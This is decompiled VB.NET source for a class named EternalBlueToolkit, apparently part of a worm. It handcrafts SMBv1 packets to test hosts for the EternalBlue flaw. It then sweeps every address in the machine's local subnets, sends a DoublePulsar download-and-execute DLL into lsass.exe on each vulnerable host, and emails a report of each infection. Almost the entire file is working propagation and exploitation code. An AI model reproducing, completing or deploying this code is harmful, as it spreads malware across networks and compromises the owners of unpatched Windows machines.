Imports System
Imports System.Collections.Generic
Imports System.Linq
Imports System.Net
Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading

Namespace Main.Tools
	' Token: 0x02000038 RID: 56
	Public Class EternalBlueToolkit
		' Token: 0x0600013E RID: 318 RVA: 0x0000B644 File Offset: 0x00009844
		Private Shared Function isSuccessfullSMB(smbHeader As EternalBlueToolkit.SMBHeader) As Boolean
			Return smbHeader.smb_status = EternalBlueToolkit.STATUS_SUCCESS
		End Function

		' Token: 0x0600013F RID: 319 RVA: 0x0000B660 File Offset: 0x00009860
		Private Shared Function SmbStatusToMessage(smbHeader As EternalBlueToolkit.SMBHeader) As String
			Return "SMB Status = 0x" + smbHeader.smb_status.ToString("X")
		End Function

		' Token: 0x06000140 RID: 320 RVA: 0x0000B68C File Offset: 0x0000988C
		Private Shared Function DataToSmbHeader(data As Byte(), receivedBytes As Integer, allowSuccessfulStatusOnly As Boolean) As EternalBlueToolkit.SMBHeader
			Dim smbheader As EternalBlueToolkit.SMBHeader = Nothing
			Dim num As Integer = 4
			Dim num2 As Integer = Marshal.SizeOf(smbheader)
			Dim num3 As Integer = num2 + 4
			If receivedBytes < num3 Then
				Throw New Exception(String.Concat(New Object() { "Bytes received = ", receivedBytes, " while required size = ", num3 }))
			End If
			Dim intPtr As IntPtr = Marshal.AllocHGlobal(num2)
			Marshal.Copy(data, num, intPtr, num2)
			smbheader = CType(Marshal.PtrToStructure(intPtr, GetType(EternalBlueToolkit.SMBHeader)), EternalBlueToolkit.SMBHeader)
			Marshal.FreeHGlobal(intPtr)
			If allowSuccessfulStatusOnly AndAlso Not EternalBlueToolkit.isSuccessfullSMB(smbheader) Then
				Throw New Exception(EternalBlueToolkit.SmbStatusToMessage(smbheader))
			End If
			Return smbheader
		End Function

		' Token: 0x06000141 RID: 321 RVA: 0x000027EE File Offset: 0x000009EE
		Private Shared Sub CheckSmbStatus(data As Byte(), receivedBytes As Integer)
			EternalBlueToolkit.DataToSmbHeader(data, receivedBytes, True)
		End Sub

		' Token: 0x06000142 RID: 322 RVA: 0x0000B740 File Offset: 0x00009940
		Private Shared Function generateSmbProtoPayload(netbios As Byte(), smb_header As Byte(), data As Byte()) As Byte()
			Return netbios.Concat(smb_header).Concat(data).ToArray()
		End Function

		' Token: 0x06000143 RID: 323 RVA: 0x0000B764 File Offset: 0x00009964
		Private Shared Function negotiateProtoRequest() As Byte()
			Dim array As Byte() = New Byte() { 0, 0, 0, 84 }
			Dim array2 As Byte() = New Byte() { Byte.MaxValue, 83, 77, 66, 114, 0, 0, 0, 0, 24, 1, 40, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 47, 75, 0, 0, 197, 94 }
			Dim array3 As Byte() = New Byte() { 0, 49, 0, 2, 76, 65, 78, 77, 65, 78, 49, 46, 48, 0, 2, 76, 77, 49, 46, 50, 88, 48, 48, 50, 0, 2, 78, 84, 32, 76, 65, 78, 77, 65, 78, 32, 49, 46, 48, 0, 2, 78, 84, 32, 76, 77, 32, 48, 46, 49, 50, 0 }
			Return EternalBlueToolkit.generateSmbProtoPayload(array, array2, array3)
		End Function

		' Token: 0x06000144 RID: 324 RVA: 0x0000B7B0 File Offset: 0x000099B0
		Private Shared Function sessionSetupAndxRequest() As Byte()
			Dim array As Byte() = New Byte() { 0, 0, 0, 99 }
			Dim array2 As Byte() = New Byte() { Byte.MaxValue, 83, 77, 66, 115, 0, 0, 0, 0, 24, 1, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 47, 75, 0, 0, 197, 94 }
			Dim array3 As Byte() = New Byte() { 13, Byte.MaxValue, 0, 0, 0, 223, Byte.MaxValue, 2, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 38, 0, 0, 46, 0, 87, 105, 110, 100, 111, 119, 115, 32, 50, 48, 48, 48, 32, 50, 49, 57, 53, 0, 87, 105, 110, 100, 111, 119, 115, 32, 50, 48, 48, 48, 32, 53, 46, 48, 0 }
			Return EternalBlueToolkit.generateSmbProtoPayload(array, array2, array3)
		End Function

		' Token: 0x06000145 RID: 325 RVA: 0x0000B7FC File Offset: 0x000099FC
		Private Shared Function treeConnectAndxRequest(ip As String, user_id As UShort) As Byte()
			Dim array As Byte() = New Byte() { 0, 0, 0, 71 }
			Dim bytes As Byte() = BitConverter.GetBytes(user_id)
			Dim array2 As Byte() = New Byte() { Byte.MaxValue, 83, 77, 66, 117, 0, 0, 0, 0, 24, 1, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 47, 75, 0, 0, 197, 94 }
			array2(28) = bytes(0)
			array2(29) = bytes(1)
			Dim array3 As Byte() = array2
			Dim array4 As Byte() = New Byte() { 4, Byte.MaxValue, 0, 0, 0, 0, 0, 1, 0, 26, 0, 0 }
			Dim text As String = "\\" + ip + "\IPC$"
			Dim bytes2 As Byte() = Encoding.UTF8.GetBytes(text)
			Dim array5 As Byte() = New Byte() { 0, 63, 63, 63, 63, 63, 0 }
			Dim array6 As Byte() = array4.Concat(bytes2).Concat(array5).ToArray()
			array(3) = CByte((array3.Length + array6.Length))
			Return EternalBlueToolkit.generateSmbProtoPayload(array, array3, array6)
		End Function

		' Token: 0x06000146 RID: 326 RVA: 0x0000B8B8 File Offset: 0x00009AB8
		Private Shared Function peekNamedPipeRequest(tree_id As UShort, process_id As UShort, user_id As UShort, multiplex_id As UShort) As Byte()
			Dim array As Byte() = New Byte() { 0, 0, 0, 74 }
			Dim array2 As Byte() = New Byte() { Byte.MaxValue, 83, 77, 66, 37, 0, 0, 0, 0, 24, 1, 40, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }.Concat(BitConverter.GetBytes(tree_id)).Concat(BitConverter.GetBytes(process_id)).Concat(BitConverter.GetBytes(user_id)).Concat(BitConverter.GetBytes(multiplex_id)).ToArray()
			Dim array3 As Byte() = New Byte() { 16, 0, 0, 0, 0, Byte.MaxValue, Byte.MaxValue, Byte.MaxValue, Byte.MaxValue, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 74, 0, 0, 0, 74, 0, 2, 0, 35, 0, 0, 0, 7, 0, 92, 80, 73, 80, 69, 92, 0 }
			Return EternalBlueToolkit.generateSmbProtoPayload(array, array2, array3)
		End Function

		' Token: 0x06000147 RID: 327 RVA: 0x0000B934 File Offset: 0x00009B34
		Private Shared Function IsVulnerableDebug(ip As String, <System.Runtime.InteropServices.OutAttribute()> ByRef statusMessage As String) As MachineScanResult.VulnerabilityStatus
			Dim random As Random = New Random()
			Thread.Sleep(random.[Next](1000))
			Dim vulnerabilityStatus As MachineScanResult.VulnerabilityStatus = CType(random.[Next](5), MachineScanResult.VulnerabilityStatus)
			statusMessage = ip + " is " + If((vulnerabilityStatus = MachineScanResult.VulnerabilityStatus.YES), "", "NOT ") + "vulnerable"
			Return vulnerabilityStatus
		End Function

		' Token: 0x06000148 RID: 328 RVA: 0x0000B984 File Offset: 0x00009B84
		Public Shared Function IsVulnerableStub(ip As String, <System.Runtime.InteropServices.OutAttribute()> ByRef statusMessage As String) As MachineScanResult.VulnerabilityStatus
			statusMessage = ""
			Dim vulnerabilityStatus As MachineScanResult.VulnerabilityStatus
			If Not Configuration.IS_DEBUG Then
				vulnerabilityStatus = EternalBlueToolkit.IsVulnerable(ip, statusMessage)
			Else
				vulnerabilityStatus = EternalBlueToolkit.IsVulnerableDebug(ip, statusMessage)
			End If
			Return vulnerabilityStatus
		End Function

		' Token: 0x06000149 RID: 329 RVA: 0x0000B9B8 File Offset: 0x00009BB8
		Private Shared Function IsVulnerable(ip As String, <System.Runtime.InteropServices.OutAttribute()> ByRef statusMessage As String) As MachineScanResult.VulnerabilityStatus
			Dim smbPayloadStatus As EternalBlueToolkit.SmbPayloadStatus = EternalBlueToolkit.SmbPayloadStatus.Connect
			Dim vulnerabilityStatus As MachineScanResult.VulnerabilityStatus = MachineScanResult.VulnerabilityStatus.NO_RESPONSE_FROM_HOST
			Dim vulnerabilityStatus2 As MachineScanResult.VulnerabilityStatus
			Try
				Dim ipendPoint As IPEndPoint = New IPEndPoint(IPAddress.Parse(ip), 445)
				Dim socket As Socket = New Socket(ipendPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
				socket.SendTimeout = EternalBlueToolkit.SEND_TIMEOUT_IN_MILLISECONDS
				socket.ReceiveTimeout = EternalBlueToolkit.RECEIVE_TIMEOUT_IN_MILLISECONDS
				socket.ReceiveBufferSize = 1024
				socket.Connect(ipendPoint)
				If Not socket.Connected Then
					Throw New Exception("Connect failed")
				End If
				vulnerabilityStatus = MachineScanResult.VulnerabilityStatus.NO_SMB1_DISABLED
				smbPayloadStatus = EternalBlueToolkit.SmbPayloadStatus.Neogtiate
				Dim array As Byte() = New Byte(socket.ReceiveBufferSize - 1) {}
				Dim array2 As Byte() = EternalBlueToolkit.negotiateProtoRequest()
				socket.Send(array2)
				Dim num As Integer = socket.Receive(array)
				EternalBlueToolkit.CheckSmbStatus(array, num)
				vulnerabilityStatus = MachineScanResult.VulnerabilityStatus.NO_SMB1_ENABLED
				smbPayloadStatus = EternalBlueToolkit.SmbPayloadStatus.SessionSetup
				array2 = EternalBlueToolkit.sessionSetupAndxRequest()
				socket.Send(array2)
				Array.Clear(array, 0, socket.ReceiveBufferSize)
				num = socket.Receive(array)
				Dim smbheader As EternalBlueToolkit.SMBHeader = EternalBlueToolkit.DataToSmbHeader(array, num, True)
				smbPayloadStatus = EternalBlueToolkit.SmbPayloadStatus.TreeConnect
				array2 = EternalBlueToolkit.treeConnectAndxRequest(ip, smbheader.user_id)
				socket.Send(array2)
				Array.Clear(array, 0, socket.ReceiveBufferSize)
				num = socket.Receive(array)
				Dim smbheader2 As EternalBlueToolkit.SMBHeader = EternalBlueToolkit.DataToSmbHeader(array, num, True)
				smbPayloadStatus = EternalBlueToolkit.SmbPayloadStatus.PeekNamedPipe
				array2 = EternalBlueToolkit.peekNamedPipeRequest(smbheader2.tree_id, smbheader2.process_id, smbheader2.user_id, smbheader2.multiplex_id)
				socket.Send(array2)
				Array.Clear(array, 0, socket.ReceiveBufferSize)
				num = socket.Receive(array)
				Dim smbheader3 As EternalBlueToolkit.SMBHeader = EternalBlueToolkit.DataToSmbHeader(array, num, False)
				smbPayloadStatus = EternalBlueToolkit.SmbPayloadStatus.ReturnCodesCheck
				If smbheader3.smb_status <> EternalBlueToolkit.STATUS_INSUFF_SERVER_RESOURCES Then
					If smbheader3.smb_status <> EternalBlueToolkit.STATUS_INVALID_HANDLE AndAlso smbheader3.smb_status <> EternalBlueToolkit.STATUS_ACCESS_DENIED Then
						vulnerabilityStatus = MachineScanResult.VulnerabilityStatus.UNKNOWN
					End If
					Throw New Exception(EternalBlueToolkit.SmbStatusToMessage(smbheader3))
				End If
				statusMessage = ip + " is VULNERABLE!!!!!!"
				vulnerabilityStatus2 = MachineScanResult.VulnerabilityStatus.YES
			Catch ex As Exception
				statusMessage = String.Concat(New Object() { ip, " ; Check Status = ", smbPayloadStatus, " ; Vulnerability Status = ", vulnerabilityStatus, " ; Message = ", ex })
				vulnerabilityStatus2 = vulnerabilityStatus
			End Try
			Return vulnerabilityStatus2
		End Function

		' Token: 0x0600014A RID: 330 RVA: 0x0000BBE4 File Offset: 0x00009DE4
		Public Sub eternalBlue()
			Try
				Dim list As List(Of List(Of String)) = New List(Of List(Of String))()
				list = Me.GrabInfo()
				Me._adapters = list(0)
				Me._startingAddress = list(1)
				Me._endingAddress = list(2)
				For i As Integer = 0 To Me._adapters.Count - 1
					Me.SearchAndDestroy(Me._startingAddress(i), Me._endingAddress(i))
				Next
			Catch
			End Try
		End Sub

		' Token: 0x0600014B RID: 331 RVA: 0x0000BC74 File Offset: 0x00009E74
		Public Sub SearchAndDestroy(StartingAddress As String, EndingAddress As String)
			Dim num As UInteger = StartingAddress.ToUInt()
			Dim num2 As UInteger = EndingAddress.ToUInt()
			While num <= num2
				Dim CS$<>8__locals1 As EternalBlueToolkit.<>c__DisplayClass26_0 = New EternalBlueToolkit.<>c__DisplayClass26_0()
				Dim CS$<>8__locals2 As EternalBlueToolkit.<>c__DisplayClass26_0 = CS$<>8__locals1
				Dim num3 As UInteger = num
				num = num3 + 1UI
				CS$<>8__locals2.Address = num3.ToIpAddress()
				Dim text As String = ""
				New EternalBlueToolkit()
				Dim vulnerabilityStatus As MachineScanResult.VulnerabilityStatus = EternalBlueToolkit.IsVulnerableStub(CS$<>8__locals1.Address.ToString(), text)
				If vulnerabilityStatus = MachineScanResult.VulnerabilityStatus.YES Then
					DoublePulsar.DeliverPayload(CS$<>8__locals1.Address.ToString(), "445", "download_exec_dll_64.dll", "RunDLL", "lsass.exe", "x64", "SMB", "WIN72K8R2")
					Dim email As Email = New Email()
					New Thread(Sub()
						email.EternalBlueEmail(CS$<>8__locals1.Address.ToString())
					End Sub) With { .Priority = ThreadPriority.Lowest, .IsBackground = True }.Start()
				End If
			End While
		End Sub

		' Token: 0x0600014C RID: 332 RVA: 0x0000BD5C File Offset: 0x00009F5C
		Public Function GrabInfo() As List(Of List(Of String))
			Dim list As List(Of List(Of String)) = New List(Of List(Of String))()
			Dim list2 As List(Of String) = New List(Of String)()
			Dim list3 As List(Of String) = New List(Of String)()
			Dim list4 As List(Of String) = New List(Of String)()
			Dim allNetworkInterfaces As NetworkInterface() = NetworkInterface.GetAllNetworkInterfaces()
			For Each networkInterface As NetworkInterface In allNetworkInterfaces
				If networkInterface.OperationalStatus = OperationalStatus.Up Then
					Try
						networkInterface.GetIPProperties()
						For Each unicastIPAddressInformation As UnicastIPAddressInformation In networkInterface.GetIPProperties().UnicastAddresses
							If unicastIPAddressInformation.Address.AddressFamily = AddressFamily.InterNetwork Then
								Dim address As IPAddress = unicastIPAddressInformation.Address
								Dim ipv4Mask As IPAddress = unicastIPAddressInformation.IPv4Mask
								Dim addressBytes As Byte() = address.GetAddressBytes()
								Dim addressBytes2 As Byte() = ipv4Mask.GetAddressBytes()
								If addressBytes.Length = addressBytes2.Length Then
									Dim array2 As Byte() = New Byte(addressBytes.Length - 1) {}
									For j As Integer = 0 To array2.Length - 1
										array2(j) = addressBytes(j) Or (addressBytes2(j) Xor Byte.MaxValue)
									Next
									Dim ipaddress As IPAddress = New IPAddress(array2)
									Dim array3 As Byte() = New Byte(addressBytes.Length - 1) {}
									For k As Integer = 0 To array3.Length - 1
										array3(k) = addressBytes(k) And addressBytes2(k)
									Next
									Dim ipaddress2 As IPAddress = New IPAddress(array3)
									list2.Add(networkInterface.Name)
									list3.Add(ipaddress2.ToString())
									list4.Add(ipaddress.ToString())
								End If
							End If
						Next
					Catch ex As Exception
					End Try
				End If
			Next
			list.Add(list2)
			list.Add(list3)
			list.Add(list4)
			Return list
		End Function

		' Token: 0x040000EF RID: 239
		Public Shared MaxComputersToScan As Integer = 16384

		' Token: 0x040000F0 RID: 240
		Public Shared RandomId As Integer = New Random().[Next]()

		' Token: 0x040000F1 RID: 241
		Public Shared IsDebug As Boolean = False

		' Token: 0x040000F2 RID: 242
		Public Shared ReportUsage As Boolean = True

		' Token: 0x040000F3 RID: 243
		Private Shared STATUS_SUCCESS As UInteger = 0UI

		' Token: 0x040000F4 RID: 244
		Private Shared STATUS_INSUFF_SERVER_RESOURCES As UInteger = 3221225989UI

		' Token: 0x040000F5 RID: 245
		Private Shared STATUS_INVALID_HANDLE As UInteger = 3221225480UI

		' Token: 0x040000F6 RID: 246
		Private Shared STATUS_ACCESS_DENIED As UInteger = 3221225506UI

		' Token: 0x040000F7 RID: 247
		Private Shared SEND_TIMEOUT_IN_MILLISECONDS As Integer = 5000

		' Token: 0x040000F8 RID: 248
		Private Shared RECEIVE_TIMEOUT_IN_MILLISECONDS As Integer = 5000

		' Token: 0x040000F9 RID: 249
		Private _adapters As List(Of String) = New List(Of String)()

		' Token: 0x040000FA RID: 250
		Private _endingAddress As List(Of String) = New List(Of String)()

		' Token: 0x040000FB RID: 251
		Private _startingAddress As List(Of String) = New List(Of String)()

		' Token: 0x02000039 RID: 57
		Private Enum SmbPayloadStatus
			' Token: 0x040000FD RID: 253
			Connect
			' Token: 0x040000FE RID: 254
			Neogtiate
			' Token: 0x040000FF RID: 255
			SessionSetup
			' Token: 0x04000100 RID: 256
			TreeConnect
			' Token: 0x04000101 RID: 257
			PeekNamedPipe
			' Token: 0x04000102 RID: 258
			ReturnCodesCheck
		End Enum

		' Token: 0x0200003A RID: 58
		<StructLayout(LayoutKind.Sequential, Pack := 1)>
		Public Structure SMBHeader
			' Token: 0x04000103 RID: 259
			Public server_component As UInteger

			' Token: 0x04000104 RID: 260
			Public smb_command As Byte

			' Token: 0x04000105 RID: 261
			Public smb_status As UInteger

			' Token: 0x04000106 RID: 262
			Public flags As Byte

			' Token: 0x04000107 RID: 263
			Public flags2 As UShort

			' Token: 0x04000108 RID: 264
			Public process_id_high As UShort

			' Token: 0x04000109 RID: 265
			Public signature As ULong

			' Token: 0x0400010A RID: 266
			Public reserved2 As UShort

			' Token: 0x0400010B RID: 267
			Public tree_id As UShort

			' Token: 0x0400010C RID: 268
			Public process_id As UShort

			' Token: 0x0400010D RID: 269
			Public user_id As UShort

			' Token: 0x0400010E RID: 270
			Public multiplex_id As UShort
		End Structure
	End Class
End Namespace
